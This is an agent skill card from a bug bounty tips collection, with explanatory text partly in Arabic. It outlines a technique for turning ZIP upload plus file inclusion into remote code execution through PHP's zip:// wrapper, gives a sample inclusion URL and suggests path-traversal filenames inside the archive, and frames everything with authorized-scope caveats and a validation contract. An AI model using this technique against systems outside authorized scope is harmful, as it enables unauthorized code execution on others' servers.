# SKILL: Zip upload path traversal → RCE via zip:// wrapper

**Skill id:** `tip/zip-upload-path-traversal-rce-via-zip-wrapper`  
**Category:** RCE  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/41ddac31e88081448808fdf8dc90c56a  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **RCE**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو التطبيق يقبل رفع ZIP ويعالج مسارات داخل الأرشيف أو يدعم wrappers مثل zip://، قد تنفّذ ملف PHP/الكود عبر مسار نسبي داخل الأرشيف. الشروط: رفع مسموح + تضمين/قراءة مسار يتحكم به المهاجم. اختبر على بيئات مصرّح بها فقط وبملف إثبات غير ضار أولًا.

## Payload / Code

```
1) Create rce.php (harmless marker preferred)
2) Zip it → [file.zip](http://file.zip)
3) Upload to vulnerable endpoint
4) Trigger inclusion if supported:
[https://target/index.php?page=zip://path/to/file.zip%23rce.php](https://target/index.php?page=zip://path/to/file.zip%23rce.php)
Also test path traversal filenames inside zip (../) against extract-to-webroot bugs.
```

## Source

Awais Nazeer tip (X) — zip upload to RCE

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
